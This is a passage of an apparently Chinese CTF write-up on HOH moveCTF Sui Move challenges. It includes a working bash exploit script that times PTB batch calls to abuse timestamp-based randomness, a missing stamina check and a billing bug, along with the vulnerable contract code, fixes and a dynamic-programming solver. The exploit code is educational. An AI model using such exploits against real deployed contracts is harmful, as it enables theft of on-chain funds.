variable">-eq</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"🎯 发现有利时间戳! 执行PTB攻击!"</span>          <span class="token keyword">if</span> execute_ptb_attack <span class="token number">20</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token comment"># 购买宝箱</span>            <span class="token assign-left variable">BUY_RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>sui client call <span class="token parameter variable">--package</span> $PACKAGE_ID <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> buy_box <span class="token parameter variable">--args</span> $USERS_TOKEN_AMOUNT_ID --gas-budget <span class="token number">20000000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>              <span class="token comment"># 提取宝箱ID并获取Flag</span>            <span class="token assign-left variable">TREASURY_BOX_ID</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$BUY_RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-A</span> <span class="token number">10</span> <span class="token string">"Created Objects"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"ID:"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'0x[a-f0-9]\&#123;64\&#125;'</span><span class="token variable">)</span></span>              <span class="token assign-left variable">FLAG_RESULT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>sui client call <span class="token parameter variable">--package</span> $PACKAGE_ID <span class="token parameter variable">--module</span> inventory <span class="token parameter variable">--function</span> get_flag <span class="token parameter variable">--args</span> $TREASURY_BOX_ID --gas-budget <span class="token number">20000000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token variable">)</span></span>              <span class="token assign-left variable">FLAG_TX_HASH</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$FLAG_RESULT</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Transaction Digest:"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'[A-Za-z0-9]\&#123;44\&#125;'</span><span class="token variable">)</span></span>            <span class="token builtin class-name">echo</span> <span class="token string">"🏁 Flag交易哈希: <span class="token variable">$FLAG_TX_HASH</span>"</span>            <span class="token builtin class-name">exit</span> <span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">fi</span>      <span class="token comment"># 重置余额并等待下一次机会</span>    sui client call <span class="token parameter variable">--package</span> <span class="token variable">$PACKAGE_ID</span> <span class="token parameter variable">--module</span> adventure <span class="token parameter variable">--function</span> init_balances <span class="token parameter variable">--args</span> <span class="token variable">$USERS_TOKEN_AMOUNT_ID</span> --gas-budget <span class="token number">10000000</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>    <span class="token function">sleep</span> <span class="token number">1</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击执行过程"><a href="#攻击执行过程" class="headerlink" title="攻击执行过程"></a>攻击执行过程</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 部署合约获取Package ID</span>Package ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05dHero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134UsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-英雄升级"><a href="#2-英雄升级" class="headerlink" title="2. 英雄升级"></a>2. 英雄升级</h3><ul><li>击败30只普通野猪获得160点经验</li><li>升级英雄：strength 10→40, defense 5→20, hp 100→200</li></ul><h3 id="3-PTB攻击"><a href="#3-PTB攻击" class="headerlink" title="3. PTB攻击"></a>3. PTB攻击</h3><ul><li>等待时间戳余数为1的有利时机</li><li>执行20次批量 <code>slay_boar_king</code>调用</li><li>成功从100 token增加到200 token</li></ul><h3 id="4-获取Flag"><a href="#4-获取Flag" class="headerlink" title="4. 获取Flag"></a>4. 获取Flag</h3><ul><li>购买宝箱（利用计费错误）</li><li>调用 <code>get_flag</code>获取Flag事件</li></ul><h2 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h2><p><strong>成功获取Flag交易哈希</strong>: <code>23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs</code></p><h2 id="技术要点总结"><a href="#技术要点总结" class="headerlink" title="技术要点总结"></a>技术要点总结</h2><ol><li><strong>漏洞组合利用</strong>: 体力消耗漏洞 + 时间戳依赖 + 计费错误</li><li><strong>PTB时间戳同步</strong>: 确保批量操作使用相同时间戳</li><li><strong>英雄升级机制</strong>: 发现并利用升级系统提升战斗力</li><li><strong>概率攻击优化</strong>: 从1&#x2F;3成功率提升到100%成功率</li></ol><h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><ol><li><strong>修复体力消耗</strong>: 取消注释 <code>hero::decrease_stamina(hero, 2)</code></li><li><strong>移除时间戳依赖</strong>: 使用安全的随机数生成</li><li><strong>修复计费错误</strong>: 统一检查和扣除金额</li><li><strong>限制批量操作</strong>: 对PTB中的重复调用进行限制</li></ol><p>这次攻击展示了智能合约中多个看似无关的小漏洞如何被巧妙组合，形成完整的攻击链。</p><h2 id="详细技术分析"><a href="#详细技术分析" class="headerlink" title="详细技术分析"></a>详细技术分析</h2><h3 id="时间戳攻击原理"><a href="#时间戳攻击原理" class="headerlink" title="时间戳攻击原理"></a>时间戳攻击原理</h3><p>Sui区块链中，同一个PTB内的所有操作共享相同的时间戳。这个特性被用来绕过随机性：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过在shell中检查时间戳并在有利时机立即执行PTB，可以确保所有20次调用都获得奖励。</p><h3 id="PTB构造技巧"><a href="#PTB构造技巧" class="headerlink" title="PTB构造技巧"></a>PTB构造技巧</h3><p>关键在于正确构造PTB命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client ptb <span class="token punctuation">\</span>  --move-call package::module::function <span class="token string">""</span> @arg1 @arg2 @arg3 <span class="token punctuation">\</span>  --move-call package::module::function <span class="token string">""</span> @arg1 @arg2 @arg3 <span class="token punctuation">\</span>  <span class="token punctuation">..</span>. <span class="token punctuation">(</span>重复20次<span class="token punctuation">)</span>  --gas-budget <span class="token number">100000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个 <code>--move-call</code>代表一次函数调用，所有调用在同一个交易中执行。</p><h3 id="英雄升级数值分析"><a href="#英雄升级数值分析" class="headerlink" title="英雄升级数值分析"></a>英雄升级数值分析</h3><p>升级前后战斗力对比：</p><table><thead><tr><th>属性</th><th>升级前</th><th>升级后</th><th>提升</th></tr></thead><tbody><tr><td>Level</td><td>1</td><td>2</td><td>+1</td></tr><tr><td>Strength</td><td>10</td><td>40</td><td>+30</td></tr><tr><td>Defense</td><td>5</td><td>20</td><td>+15</td></tr><tr><td>HP</td><td>100</td><td>200</td><td>+100</td></tr></tbody></table><p>野猪王属性范围：</p><ul><li>HP: 180-220</li><li>Strength: 20-25</li><li>Defense: 10-15</li></ul><p>升级后英雄的40点攻击力可以轻松突破野猪王的10-15防御。</p><h2 id="攻击时间线"><a href="#攻击时间线" class="headerlink" title="攻击时间线"></a>攻击时间线</h2><ol><li><strong>00:00</strong> - 分析合约代码，发现多个漏洞</li><li><strong>00:30</strong> - 尝试直接攻击野猪王，发现战斗力不足</li><li><strong>01:00</strong> - 研究英雄升级机制</li><li><strong>01:30</strong> - 击败30只普通野猪，升级英雄</li><li><strong>02:00</strong> - 开发PTB攻击脚本</li><li><strong>02:30</strong> - 成功执行攻击，获取Flag</li></ol><h2 id="关键代码片段"><a href="#关键代码片段" class="headerlink" title="关键代码片段"></a>关键代码片段</h2><h3 id="漏洞代码1-体力消耗被注释"><a href="#漏洞代码1-体力消耗被注释" class="headerlink" title="漏洞代码1: 体力消耗被注释"></a>漏洞代码1: 体力消耗被注释</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">entry fun <span class="token function">slay_boar_king</span><span class="token punctuation">(</span>clock<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token class-name">Clock</span><span class="token punctuation">,</span> usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> hero<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Hero</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> sender <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">hero<span class="token punctuation">::</span></span><span class="token function">stamina</span><span class="token punctuation">(</span>hero<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">EHERO_TIRED</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ...</span>    <span class="token keyword">let</span> fight_result <span class="token operator">=</span> fight_monster<span class="token operator">&lt;</span><span class="token class-name">BoarKing</span><span class="token operator">></span><span class="token punctuation">(</span>hero<span class="token punctuation">,</span> <span class="token operator">&amp;</span>boar<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//hero::decrease_stamina(hero, 2);  // ← 关键漏洞：被注释掉</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞代码2-时间戳依赖"><a href="#漏洞代码2-时间戳依赖" class="headerlink" title="漏洞代码2: 时间戳依赖"></a>漏洞代码2: 时间戳依赖</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">if</span> <span class="token punctuation">(</span>fight_result <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> current_timestamp <span class="token operator">=</span> <span class="token namespace">clock<span class="token punctuation">::</span></span><span class="token function">timestamp_ms</span><span class="token punctuation">(</span>clock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> d100 <span class="token operator">=</span> current_timestamp <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">// ← 可预测的"随机"数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>d100 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// 奖励</span>        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment">// 惩罚</span>        <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞代码3-计费错误"><a href="#漏洞代码3-计费错误" class="headerlink" title="漏洞代码3: 计费错误"></a>漏洞代码3: 计费错误</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">buy_box</span><span class="token punctuation">(</span>usersTokenAmount<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">UsersTokenAmount</span><span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> sender <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> current_balance <span class="token operator">=</span> <span class="token namespace">table<span class="token punctuation">::</span></span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> usersTokenAmount<span class="token punctuation">.</span>balances<span class="token punctuation">,</span> sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">Amount</span><span class="token punctuation">&#123;</span>amount<span class="token punctuation">:</span> <span class="token operator">*</span>current_balance<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token operator">*</span>current_balance <span class="token operator">>=</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token constant">ERROR_NO_MONEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 检查200</span>    <span class="token operator">*</span>current_balance <span class="token operator">=</span> <span class="token operator">*</span>current_balance <span class="token operator">-</span> <span class="token number">100</span><span class="token punctuation">;</span>         <span class="token comment">// ← 但只扣100</span>    <span class="token keyword">let</span> <span class="token keyword">box</span> <span class="token operator">=</span> <span class="token namespace">inventory<span class="token punctuation">::</span></span><span class="token function">create_treasury_box</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token namespace">transfer<span class="token punctuation">::</span></span><span class="token function">public_transfer</span><span class="token punctuation">(</span><span class="token keyword">box</span><span class="token punctuation">,</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整攻击脚本"><a href="#完整攻击脚本" class="headerlink" title="完整攻击脚本"></a>完整攻击脚本</h2><p>将攻击脚本保存为 <code>ptb_batch_attack.sh</code> 并执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x ptb_batch_attack.sh./ptb_batch_attack.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>脚本会自动：</p><ol><li>监控时间戳，等待有利时机</li><li>执行PTB批量攻击</li><li>购买宝箱并获取Flag</li><li>输出Flag交易哈希</li></ol><h2 id="学习要点"><a href="#学习要点" class="headerlink" title="学习要点"></a>学习要点</h2><ol><li><strong>代码审计重要性</strong>: 仔细检查每一行代码，包括注释</li><li><strong>漏洞组合威力</strong>: 多个小漏洞组合可能产生严重影响</li><li><strong>区块链特性利用</strong>: 理解PTB等区块链特有机制</li><li><strong>攻击链构造</strong>: 从信息收集到最终利用的完整流程</li></ol><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://docs.sui.io/concepts/sui-move-concepts">Sui Move 官方文档</a></li><li><a href="https://docs.sui.io/concepts/transactions/prog-txn-blocks">PTB 编程指南</a></li><li><a href="https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md">智能合约安全最佳实践</a></li></ul><hr><h1 id="2-强盗游戏"><a href="#2-强盗游戏" class="headerlink" title="2. 强盗游戏"></a>2. 强盗游戏</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul><li><strong>题目名称</strong>: 强盗游戏</li><li><strong>题目积分</strong>: 52</li><li><strong>分类</strong>: blockchain, hohctf, sui, move</li><li><strong>解题人数</strong>: 46</li></ul><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>房屋加权的强盗游戏，你能成功获取目标金额吗？HOH moveCTF 强盗游戏</p><p>题目提供了一个独特的 Sui Move 合约：</p><ul><li><strong>Package ID</strong>: <code>0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c</code></li><li><strong>部署交易哈希</strong>: <code>JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY</code></li></ul><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="1-合约分析"><a href="#1-合约分析" class="headerlink" title="1. 合约分析"></a>1. 合约分析</h3><p>首先分析Move合约源码，发现这是一个基于动态规划的”房屋强盗”问题变种：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">module <span class="token namespace">game<span class="token punctuation">::</span></span>ez_game <span class="token punctuation">&#123;</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">Challenge</span> has key<span class="token punctuation">,</span> store <span class="token punctuation">&#123;</span>        id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>        initial_part<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>        weights<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>        target_amount<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    public <span class="token keyword">struct</span> <span class="token type-definition class-name">Flag</span> has copy<span class="token punctuation">,</span> drop <span class="token punctuation">&#123;</span>        owner<span class="token punctuation">:</span> address<span class="token punctuation">,</span>        flag<span class="token punctuation">:</span> <span class="token keyword">bool</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键函数：</p><ul><li><code>init_game</code>: 初始化游戏，创建Challenge对象，设置随机目标金额(10-20)</li><li><code>get_flag</code>: 验证用户输入，如果计算结果等于目标金额则触发Flag事件</li><li><code>weighted_rob</code>: 加权房屋强盗算法核心实现</li></ul><h3 id="2-算法理解"><a href="#2-算法理解" class="headerlink" title="2. 算法理解"></a>2. 算法理解</h3><p><code>weighted_rob</code>函数实现了一个动态规划算法：</p><ul><li>初始房屋：<code>[1, 1, 3, 1, 1]</code></li><li>初始权重：<code>[1, 1, 2, 1, 1]</code></li><li>用户可以添加额外房屋（权重默认为1）</li><li>不能抢劫相邻的房屋</li><li>每个房屋的价值 &#x3D; 房屋值 × 权重</li><li>目标：找到最大收益</li></ul><h3 id="3-解题脚本"><a href="#3-解题脚本" class="headerlink" title="3. 解题脚本"></a>3. 解题脚本</h3><p>编写Python脚本分析所有可能的目标金额：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">weighted_rob</span><span class="token punctuation">(</span>houses<span class="token punctuation">,</span> weights<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>houses<span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>houses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>            houses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            houses<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        dp_i_1 <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>        dp_i_2_plus_house <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> houses<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp_i_1<span class="token punctuation">,</span> dp_i_2_plus_house<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析发现所有目标金额的解决方案：</p><ul><li>目标金额 10 → 用户输入: [3]</li><li>目标金额 11 → 用户输入: [4]</li><li>目标金额 12 → 用户输入: [5]</li><li>…</li><li>目标金额 20 → 用户输入: [13]</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="1-初始化游戏"><a href="#1-初始化游戏" class="headerlink" title="1. 初始化游戏"></a>1. 初始化游戏</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> ez_game <span class="token parameter variable">--function</span> init_game <span class="token parameter variable">--args</span> 0x8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建了Challenge对象：<code>0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92</code></p><h3 id="2-查看Challenge对象"><a href="#2-查看Challenge对象" class="headerlink" title="2. 查看Challenge对象"></a>2. 查看Challenge对象</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到关键信息：</p><ul><li><strong>目标金额</strong>: 15</li><li><strong>初始房屋</strong>: [1, 1, 3, 1, 1]</li><li><strong>权重</strong>: [1, 1, 2, 1, 1]</li></ul><h3 id="3-计算解决方案"><a href="#3-计算解决方案" class="headerlink" title="3. 计算解决方案"></a>3. 计算解决方案</h3><p>根据目标金额15，对应的用户输入是 <code>[8]</code>。</p><p>验证计算过程：</p><ul><li>完整房屋列表：<code>[1, 1, 3, 1, 1, 8]</code></li><li>完整权重列表：<code>[1, 1, 2, 1, 1, 1]</code></li><li>DP计算：<ul><li>dp[0] &#x3D; 1 × 1 &#x3D; 1</li><li>dp[1] &#x3D; max(1×1, 1×1) &#x3D; 1</li><li>dp[2] &#x3D; max(1, 1 + 3×2) &#x3D; 7</li><li>dp[3] &#x3D; max(7, 1 + 1×1) &#x3D; 7</li><li>dp[4] &#x3D; max(7, 7 + 1×1) &#x3D; 8</li><li>dp[5] &#x3D; max(8, 7 + 8×1) &#x3D; 15 ✓</li></ul></li></ul><h3 id="4-获取Flag-1"><a href="#4-获取Flag-1" class="headerlink" title="4. 获取Flag"></a>4. 获取Flag</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sui client call <span class="token parameter variable">--package</span> 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c <span class="token punctuation">\</span>  <span class="token parameter variable">--module</span> ez_game <span class="token parameter variable">--function</span> get_flag <span class="token punctuation">\</span>  <span class="token parameter variable">--args</span> <span class="token string">"[8]"</span> 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="解题结果"><a href="#解题结果" class="headerlink" title="解题结果"></a>解题结果</h2><p><strong>成功触发Flag事件！</strong></p><p><strong>触发Flag的交易哈希</strong>: <code>3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa</code></p><p>交易事件中显示：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol><li><strong>Sui Move合约交互</strong>: 理解Sui区块链的对象模型和交易机制</li><li><strong>动态规划算法</strong>: 掌握房屋强盗问题的经典DP解法</li><li><strong>加权变种</strong>: 理解权重对算法结果的影响</li><li><strong>随机性处理</strong>: 分析所有可能的目标金额并预计算解决方案</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题目巧妙地将经典的动态规划问题与区块链技术结合，考查了：</p><ul><li>Move语言和Sui区块链的基础知识</li><li>动态规划算法的理解和实现</li><li>逆向分析和解题思维</li></ul><hr><h1 id="3-恢复密钥"><a href="#3-恢复密钥" class="headerlink" title="3. 恢复密钥"></a>3. 恢复密钥</h1><h2 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h2><ul><li><strong>题目名称</strong>: 恢复私钥</li><li><strong>题目积分</strong>: 